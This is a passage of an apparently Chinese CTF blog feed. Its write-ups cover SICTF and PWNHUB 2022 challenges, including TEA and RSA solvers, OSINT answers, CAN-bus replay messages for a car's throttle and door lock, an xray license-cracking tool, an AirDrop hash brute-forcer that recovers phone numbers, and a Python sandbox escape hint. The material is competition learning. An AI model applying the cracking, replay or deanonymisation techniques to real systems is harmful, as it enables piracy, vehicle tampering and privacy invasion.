class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-type">uint32_t</span>  delta = <span class="hljs-number">0x61C88647</span>, sum = delta * num_rounds;<br>        <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">2</span> * j], v1 = v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br><br>            v1 -= ((((v0 * <span class="hljs-number">8</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])) ^ <span class="hljs-number">3</span>;<br>            sum -= delta;<br>            v0 -= (((v1 * <span class="hljs-number">8</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br><br>        v[<span class="hljs-number">2</span> * j] = v0; v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = v1;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>] = &#123; <span class="hljs-number">0xab603776</span>,<span class="hljs-number">0xb9b07148</span>,<span class="hljs-number">0xbff5ec79</span>,<span class="hljs-number">0x4e93cb5e</span>,<span class="hljs-number">0xcbb3b436</span>,<span class="hljs-number">0x41d24b4d</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x12345678</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x23456789</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x34567890</span> ,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x45678901</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    decipher(r, v, k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">3</span>; j &gt;= <span class="hljs-number">0</span>; j--)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v[i] &gt;&gt; (j * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//flag&#123;t5a_1s_very_n1C5!!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h4 id="朋友圈中的秘密"><a href="#朋友圈中的秘密" class="headerlink" title="朋友圈中的秘密"></a>朋友圈中的秘密</h4><p><img src="/mdimg/sictf/38.png"><br><strong>面向出题人做题法：</strong><br><strong>一眼丁真汉堡王（桌子上的可乐）</strong><br>地图查找左上角的商家（顺义区）（树木是顺义区的）<br>范围很小，一个一个试就行<br><img src="/mdimg/sictf/39.png"><code>SICTF&#123;北京市-顺义区-新顺南大街-11号-汉堡王&#125;                        </code></p><h4 id="小镇后面的山"><a href="#小镇后面的山" class="headerlink" title="小镇后面的山"></a>小镇后面的山</h4><p><img src="/mdimg/sictf/40.png"><br>直接google识图<br><img src="/mdimg/sictf/41.png"><br>随便搜都能找到，然后查了一下这个地方，确实有一个大学<br><a href="https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/">https://www.adventurouskate.com/grenoble-on-a-perfect-winter-day/</a><br><code>SICTF&#123;格勒诺布尔-阿尔卑斯山脉&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022PWNHUB冬季赛</title>
    <link href="/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/"/>
    <url>/2023/02/05/2022PWNHUB%E5%86%AC%E5%AD%A3%E8%B5%9BWrite%20Up/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/2022PWNHUB/1671426618514.jpg"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h2><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><br>R = getPrime(<span class="hljs-number">256</span>)<br>S = getPrime(<span class="hljs-number">512</span>)<br>A = getPrime(<span class="hljs-number">1024</span>)<br><br>N = R * S * A<br>c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">0x10001</span>, N)<br><br>RA = R &amp; A<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA1&#x27;</span>,<span class="hljs-built_in">hex</span>(RA * S))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;RSA2&#x27;</span>,<span class="hljs-built_in">hex</span>(RA | S))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-built_in">hex</span>(c))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-built_in">hex</span>(N))<br><br><span class="hljs-comment"># RSA1 0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br><span class="hljs-comment"># RSA2 0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br><span class="hljs-comment"># c 0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br><span class="hljs-comment"># N 0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br></code></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>S=GCD(RSA1,N)<br>d=inverse(<span class="hljs-number">0x10001</span>,S-<span class="hljs-number">1</span>)<br>m=<span class="hljs-built_in">pow</span>(c,d,S)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#flag&#123;b66f68258f184bd7afddd32c1518eed0&#125;</span><br></code></pre></td></tr></table></figure><p>预期解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>RSA1=<span class="hljs-number">0x97be543979cb98c109103fa118c1c930ff13a6b2562166417021afd6e46cb0837a5cc5f4094fcea5fcc33efdfa495050e0fb8269922b3ee2d403210ed1ba339af2dc3d4e8952f0c784fcc655436cf255b98cdaf8080df47f6c28bc0bae68c713</span><br>RSA2=<span class="hljs-number">0xa887aa84f3a0bd8b79ed59a7bb98d8e58a85414f85cf2ddf53ff4bd9294bfdadf7d6d6adfe7fbed55fc71b5a6bfcfe79ced27e2f41e7546a8679daf5b63dda37</span><br>c=<span class="hljs-number">0x2f62fb7e7e8e27823193119f8412050ade9084ade25261a5875da23a07d5d5145e72d460697984d8aa668a25822009a4fdc85df2b208941cd3219b312f21c3c7bc4ef7aa8c18b4f91a0e815fe1892fca0f72406e571fbd0fea2c4710c601165ccd7e8a5a828721a5e2c956b732223d683d1413ef393b5f80a431c52bf9099e22b8e27daafb9d3e055242b89b5419b8925744ccf348e1bea519225af8efe7dbcc202425251039cbfe6b892a7fcf7e9d72224ea9381e3fb32ab837139af4b4112a3c7a6571c88e7d6c5db4c3f91e25edd15eb5544ef2f29a9e1bb1062ec86f1902</span><br>N=<span class="hljs-number">0x58a7ff25292651e1a8d82656d64fe3b458d6e688405e85aa6c02e0c33469ad3dbaef6c6eaf8faf22f2d15e80856ab7b90a40fd50c36f7b59932bc94e6fb4fabefa87b11bf4ef74df4ccf8d254f0c6812628df3c5b3786af35e3dde9c87b462d1a565af6f100750718ccb7235174947f00cec5836765150f1680d0c58a5f9ea2473a6033c218c75664dc53377dde9386f37e1a89d77e61a716129d290c5a41f81cd3490bab6fe51f232ab27cb1ac9c8eb88e908c12109a125b7439c25b6879283a17a3467823fbb089709eb836cfd03386cc4bf186eb45401472ab0bdec605fd7</span><br><br>offset = <span class="hljs-number">256</span><br>RSA2 &gt;&gt;= offset<br>RSA2 &lt;&lt;= offset<br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(RSA1))<br>f = x + RSA2<br>roots = f.small_roots(X=<span class="hljs-number">2</span>^offset, beta = <span class="hljs-number">0.4</span>)<br>S = RSA2 + roots[<span class="hljs-number">0</span>]<br>S = <span class="hljs-built_in">int</span>(S)<br><br>cc = <span class="hljs-built_in">int</span>(c % S)<br><span class="hljs-built_in">print</span>(cc)<br>d = <span class="hljs-built_in">int</span>(inverse(<span class="hljs-number">0x10001</span>, S-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(cc,d,S)))<br></code></pre></td></tr></table></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1755716071599</span><br>N = <span class="hljs-number">236038564943567983056828121309828109017</span><br>Px, Py =<br>b = ZZ((Py**<span class="hljs-number">2</span> - Px**<span class="hljs-number">3</span> - a * Px) % N)<br>e = (b&lt;&lt;<span class="hljs-number">42</span>) + a<br><br>enc1 = <span class="hljs-number">98662590652068949920571979585725979127266112216583776160769090971169664292493813021843624362593669574513220457664819153878956311077379392531742253343961645534972639309537402874636739745717765969720117162780620981639015788423324884640935466801234207019510919768602974162878323777374364290185048275714332671356</span><br>enc2 = <span class="hljs-number">58738699705013897273174837829098879580829898980458718341881900446701910685043213698485036350888862454440118347362218485065377354137391792039111639199258042591959084091242821874819864955504791788260187064338245516327147327866373690756260239728218244294166383516151782123688633986853602732137707507845681977204</span><br>NN = <span class="hljs-number">149794788177729409820185150543033616327574456754306207341321223589733698623477041345453230785413920341465642754285280273761269552897080096162195035057667200692677841848045965505750839903359478511509753781737513122660495056746669041957643882516287304836822410136985711091802722010788615177574143908444311475347</span><br>M = matrix(ZZ, [<br>    [<span class="hljs-number">2</span>**<span class="hljs-number">256</span>, enc1, enc2],<br>    [<span class="hljs-number">0</span>, NN, <span class="hljs-number">0</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, NN]<br>])<br>L = M.LLL()<br>hd, ld = L[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], L[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]<br>d = (hd&lt;&lt;<span class="hljs-number">512</span>) + ld<br><br>n = <span class="hljs-number">236038564943567983056828121309828109017</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*d, n) == <span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    k = e * d - <span class="hljs-number">1</span><br>    g = randint(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        x = <span class="hljs-built_in">pow</span>(g, k, n)<br>        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> n &gt; GCD(x - <span class="hljs-number">1</span>, n) &gt; <span class="hljs-number">1</span>:<br>            p = GCD(x - <span class="hljs-number">1</span>, n)<br>            q = n // p<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;p = &#125;</span>\n<span class="hljs-subst">&#123;q = &#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(p * q == n)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                <span class="hljs-built_in">print</span>(long_to_bytes(p &gt;&gt; i))<br>                <span class="hljs-built_in">print</span>(long_to_bytes(q &gt;&gt; i))<br>            exit()<br>        <span class="hljs-keyword">if</span> k % <span class="hljs-number">2</span>:<span class="hljs-keyword">break</span><br>        k //= <span class="hljs-number">2</span><br><span class="hljs-comment"># flag&#123;e89f47939d12434cb201080d8b240774&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h2><p>前置知识<br><code>[https://www.anquanke.com/post/id/106409?from=timeline#h2-1](https://www.anquanke.com/post/id/106409?from=timeline#h2-1)</code><br>CAN报文分析，使用重放攻击解题<br><code>[http://www.hackdig.com/09/hack-771228.htm](http://www.hackdig.com/09/hack-771228.htm)</code><br>需要去GitHub下载最新版can-utils才能实现挨个手调<br><code>[GitHub - linux-can/can-utils: Linux-CAN / SocketCAN user space applications](https://github.com/linux-can/can-utils)</code><br>查看日志 将异常流量提取出来可以更快的调试完毕<br>直接筛选244#（油门流量）的异常流量去进行手调<br><code>./canplayer -I ./xxx.txt -v -i</code>逐行调试命令<br><img src="/mdimg/2022PWNHUB/1671280983003.png"><br><img src="/mdimg/2022PWNHUB/1671281025564.png"><br>表盘在此发生突变所以报文异常为<code>244#000000A60000</code><br>结合一道国外CAN报文题目可以得知<code>19B#00000F000000</code>为门锁攻击异常流量<br><img src="/mdimg/2022PWNHUB/1671353189895.png"><br>没想到直接交就对了 还没来得及对门锁流量进行调试  还需要对can-utils源码进行更深入学习才行 太菜了<br><code>flag&#123;19B#00000F000000_244#000000A60000&#125;</code></p><h2 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h2><p>使用 -h 查看帮助</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> &gt; .\xray<span class="hljs-literal">-cracker</span> <span class="hljs-literal">-h</span><br>破解xray高级版证书，使用 <span class="hljs-literal">-h</span> 参数查看使用帮助<br><br>Usage of xray<span class="hljs-literal">-cracker</span>:<br><span class="hljs-literal">-c</span> string<br>替换xray程序内置公钥，需要指定xray程序文件路径<br><span class="hljs-literal">-g</span> string<br>生成一个永久license，需要指定用户名<br><span class="hljs-literal">-p</span> string<br>解析官方证书，需要指定证书路径<br><br></code></pre></td></tr></table></figure><p>使用<code>.\xray-cracker -p xray-license.lic</code>查看即可<br><code>flag&#123;3270cdada4eb4a809d25ff4820d5a1f7&#125;</code></p><h2 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h2><p>下载附件后一眼Airdrop取证（小姐姐好看捏）  感谢Qsugar师傅送的盘古石<br>导入日志文件<br><img src="/mdimg/2022PWNHUB/6bccea041523f122f7dff78a999130d.png"><br>利用盘古石 Airdrop 哈希转换工具得到手机号码<br><img src="/mdimg/2022PWNHUB/11481d495e07b31136a6cb8af72db65.png"><code>flag&#123;18800009527&#125;</code><br>爆破脚本 爆破速度感人</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>targetstart = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash start fragment: &#x27;</span>)<br>targetend = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;[+] Enter the target hash end fragment: &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Checking all Chinese areacode&#x27;</span>)<br>areacodelist = [<span class="hljs-string">&#x27;139&#x27;</span>, <span class="hljs-string">&#x27;138&#x27;</span>, <span class="hljs-string">&#x27;137&#x27;</span>, <span class="hljs-string">&#x27;136&#x27;</span>, <span class="hljs-string">&#x27;135&#x27;</span>, <span class="hljs-string">&#x27;134&#x27;</span>, <span class="hljs-string">&#x27;159&#x27;</span>, <span class="hljs-string">&#x27;158&#x27;</span>,<span class="hljs-string">&#x27;157&#x27;</span>,<span class="hljs-string">&#x27;150&#x27;</span>,<span class="hljs-string">&#x27;151&#x27;</span>, <span class="hljs-string">&#x27;152&#x27;</span>, <span class="hljs-string">&#x27;188&#x27;</span>, <span class="hljs-string">&#x27;187&#x27;</span>, <span class="hljs-string">&#x27;182&#x27;</span>, <span class="hljs-string">&#x27;183&#x27;</span>, <span class="hljs-string">&#x27;184&#x27;</span>, <span class="hljs-string">&#x27;178&#x27;</span>]<br>phonematch = []<br><br><span class="hljs-keyword">for</span> areacode <span class="hljs-keyword">in</span> areacodelist:<br>    line = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Searching area code &#x27;</span> + areacode + <span class="hljs-string">&#x27; for target...&#x27;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) &lt; <span class="hljs-number">100000000</span>:<br>        targetphone = <span class="hljs-string">&#x27;86&#x27;</span> + <span class="hljs-built_in">str</span>(areacode) + <span class="hljs-built_in">str</span>(line).zfill(<span class="hljs-number">8</span>)<br>        targettest = hashlib.sha256(targetphone.encode())<br>        starthashcheck = targettest.hexdigest() [<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>        endhashcheck = targettest.hexdigest() [-<span class="hljs-number">5</span>:]<br>        <span class="hljs-keyword">if</span> starthashcheck == targetstart.lower() <span class="hljs-keyword">and</span> endhashcheck ==targetend.lower():<br>            phonematch.append(targetphone)<br>            <span class="hljs-built_in">print</span>(targetphone + <span class="hljs-string">&#x27; matches hash fragments. Stillchecking...&#x27;</span>)<br>        line = <span class="hljs-built_in">int</span>(line) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">int</span>(line) == <span class="hljs-number">100000000</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> phonematch:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your target\&#x27;s phone number may be:&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> phonematch:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Target phone number not found in this area code set. Targetphone may use another country code.&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h2><p>可以使⽤的字符有``string.ascii_letters + string.digits + “,!?;#+-/$@&amp;|~^&lt;&gt;(){}”<code> 这些⽅法</code>“getattr”, “exec”, “open”, “<strong>builtins</strong>“, “<strong>build_class</strong>“, “<strong>loader</strong>“, “<strong>spec</strong>“<code>都被 禁⽤了，那么这个时候可以选择⽤</code>chr()<code>来绕过，当然也可以⽤</code>eval(input())`绕过。<br><img src="/mdimg/2022PWNHUB/1671287243843.png"><br><img src="/mdimg/2022PWNHUB/1671589681536.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="justJS"><a href="#justJS" class="headerlink" title="justJS"></a>justJS</h2><p>非预期了。。。<br><img src="/mdimg/2022PWNHUB/1671280829207.png"></p><h1 id="GAMING"><a href="#GAMING" class="headerlink" title="GAMING"></a>GAMING</h1><h2 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h2><p>注册账号登录即可get flag</p><h2 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h2><p>修改器直接改<br><img src="/mdimg/2022PWNHUB/1.png"><br>将官职修改到督邮以上<br><img src="/mdimg/2022PWNHUB/2.png"><br>重新登陆，查看邮箱<br><img src="/mdimg/2022PWNHUB/3.png"></p><h2 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h2><p><img src="/mdimg/2022PWNHUB/4.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" 